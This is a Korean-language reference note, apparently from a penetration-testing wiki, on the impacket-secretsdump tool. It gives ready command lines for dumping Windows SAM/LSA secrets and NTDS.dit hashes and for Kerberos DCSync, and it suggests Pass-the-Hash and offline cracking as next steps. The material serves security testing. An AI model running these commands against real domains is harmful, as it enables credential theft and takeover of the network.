---
tags:
  - 환경/windows
  - 서비스/smb
  - 기능/자격증명수집
실행환경: ["Linux"]
필요권한: ["원격 dump 시 관리자 권한", "DCSync 시 AD 복제 권한", "오프라인 파일 읽기 권한"]
필요조건: ["원격 관리자 인증 정보, 일치하는 hive 파일 세트 또는 AD 복제 권한"]
결과: ["자격증명", "해시", "Kerberos key"]
---

# impacket-secretsdump

## 도구 개요

`impacket-secretsdump`는 Windows의 SAM·SECURITY·SYSTEM hive와 NTDS.dit 또는 원격 복제 인터페이스에서 계정 hash·LSA secret·Kerberos key를 추출한다. 오프라인 파일 분석, 원격 관리자 dump, DCSync를 한 도구에서 지원하지만 각 모드는 서로 다른 입력과 권한을 사용한다.

## 필요한 입력과 실행 환경

- 실행 위치: Impacket이 설치된 Linux 호스트
- 원격 입력: 대상 주소와 관리자 credential/hash/ticket; DC dump에는 AD 복제 권한
- 오프라인 입력: SAM, SECURITY, SYSTEM hive 또는 NTDS.dit와 일치하는 SYSTEM hive
- 범위 입력: 필요하면 `-just-dc`, `-just-dc-user`, `-sam`, `-security`, `-system`으로 수집 범위를 제한한다.


## 표준 사용법

```bash
impacket-secretsdump [options] <target>
```

오프라인 hive 분석은 `LOCAL` 대상을 사용하고, 원격 대상은 `<DOMAIN>/<USER>:<PASSWORD>@<TARGET>` 형식으로 지정한다.

## 대표 예시

### 오프라인 SAM/SECURITY/SYSTEM hive 덤프

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

### 오프라인 NTDS.dit에서 도메인 hash 추출

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### 원격 Windows 호스트에서 SAM·LSA·NTDS 계정 자료 덤프

```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET>
```


### Kerberos 인증으로 특정 사용자 DCSync

```bash
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user <USER> <DOMAIN>/<ACCOUNT>@<DC_HOST>
```

`<ACCOUNT>`는 ccache에 기록된 요청 계정이고 `-just-dc-user <USER>`는 자격 증명을 추출할 별도 대상 계정이다.

파일 저장이 필요하면 기존 항목과 겹치지 않는 전용 접두부를 지정한다.

```bash
impacket-secretsdump -outputfile '<OUTPUT_DIRECTORY>/<OUTPUT_PREFIX>' -k -no-pass -dc-ip <DC_IP> -just-dc-user <USER> <DOMAIN>/<ACCOUNT>@<DC_HOST>
find '<OUTPUT_DIRECTORY>' -maxdepth 1 -type f -name '<OUTPUT_PREFIX>.*' -print
```

`-outputfile`은 단일 파일명이 아니라 base 이름이다. 실제 생성된 `.ntds`, `.ntds.kerberos`, `.ntds.cleartext` 등의 exact 경로를 기록하고, 처리 순서와 잔여 영향은 [[DCSync]]의 변경 영향과 복구를 따른다.


## 주요 옵션

| 옵션 | 설명 |
|---|---|
| `-sam`, `-security`, `-system` | 오프라인 hive 파일 지정 |
| `-ntds` | NTDS.dit 파일 지정 |
| `LOCAL` | 로컬 파일 기반 분석 모드 |
| `-use-vss` | 기본 DRSUAPI 대신 원격 `NTDSUTIL` VSS 방식을 사용. DC 관리자급 원격 작업 권한과 생성 자원 정리 확인이 필요 |
| `-exec-method` | `-use-vss`에서 사용할 원격 실행 방식 선택. 현재 구현은 `smbexec`, `wmiexec`, `mmcexec`을 제공 |
| `-just-dc`, `-just-dc-user` | DC 계정 데이터 또는 특정 사용자만 덤프 |
| `-just-dc-ntlm` | DC dump에서 NTLM hash만 출력 |
| `-outputfile` | NTLM·Kerberos·cleartext 결과를 접두부별 파일로 저장 |
| `-history` | 이전 password hash 이력 포함 |
| `-pwd-last-set` | password 마지막 변경 시각 포함 |
| `-user-status` | 계정 활성·비활성 상태 포함 |
| `-hashes` | NTLM hash 인증 |
| `-k`, `-no-pass` | Kerberos/ccache 기반 인증 |
| `-dc-ip` | 인증에 사용할 KDC/DC IP 지정. 단일 realm에서는 이름 해석을 보완하지만 cross-realm에서는 잘못된 KDC 고정 여부를 확인 |
| `-target-ip` | 대상 이름과 Kerberos SPN은 유지하고 실제 네트워크 연결에 사용할 IP 지정 |
| `-debug` | ccache 선택, SPN 검색과 KDC 연결 단계를 출력해 cross-realm 실패 지점 확인 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| 로컬 SAM NTLM hash·LSA secret 출력 | 로컬 계정 hash 또는 서비스·저장 secret 확보 | Pass the Hash 가능성, 오프라인 비밀번호 복구와 각 계정 권한 확인 |
| NTDS.dit 또는 DRSUAPI 출력 | 도메인 계정 NTLM hash·Kerberos key·비밀번호 이력 확보 | 계정 유형과 권한을 구분하고 hash·key의 후속 인증 가능성 확인 |
| `RemoteOperations failed` | 원격 SAM·LSA 방식의 Remote Registry/권한/방화벽 문제 | 인증과 관리자 권한을 확인한 뒤 서비스 상태와 `-use-vss` 방식 검토 |
| `STATUS_ACCESS_DENIED` | 권한 부족 | 로컬 관리자/도메인 권한과 target 선택 재확인 |
| DRSUAPI 실패 | DC 권한 또는 네트워크 문제 | 대상이 DC인지, 복제 권한, `-just-dc-user` 범위 확인 |
| `KDC_ERR_WRONG_REALM` | 요청한 realm과 연결한 KDC가 다름 | cross-realm에서 `-dc-ip`가 잘못된 KDC를 고정했는지 확인하고 양쪽 realm DNS·KDC 경로 검증 |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | KDC가 ticket의 요청 계정을 찾지 못함 | ccache에 기록된 요청 계정, ticket에 넣은 실제 사용자와 RID, 자식 realm 확인 |
| Kerberos 오류 뒤 `Try again with -use-vss` | 인증·KDC 단계에서 이미 실패한 뒤 표시된 일반 fallback 안내 | 선행 Kerberos 오류부터 해결하고 인증 성공 전에는 VSS 전환을 근본 해결로 취급하지 않음 |
| `.ntds.cleartext` 생성 | 가역 암호화 저장 계정의 복호화 가능한 값 존재 | 계정·범위를 확인하고 민감 산출물로 보호 |
| 출력 일부 누락 | 보호 기능 또는 권한 제한 | hive 파일 방식, VSS, 오프라인 덤프 검토 |

`-use-vss`는 단순 읽기 전용 switch가 아니다. 실행 전 Remote Registry와 관련 원격 실행 자원의 상태를 확인하고, 정상 종료의 `Cleaning up...` 뒤에도 이번 실행의 임시 service·file·snapshot이 남지 않았는지 [[NTDS.dit 덤프#변경 영향과 복구]]의 식별값 기준으로 대조한다. 도구 버전이나 원격 연결 중단 때문에 식별값을 확인할 수 없으면 복구 완료로 판정하지 않는다.

## 참고 링크

- [Fortra Impacket: secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [Fortra Impacket: secretsdump implementation](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)

## 관련 공격기법

- [[Windows SAM SECURITY SYSTEM 덤프]]
- [[NTDS.dit 덤프]]
- [[DCSync]]
- [[자식 도메인 ExtraSids Golden Ticket]]
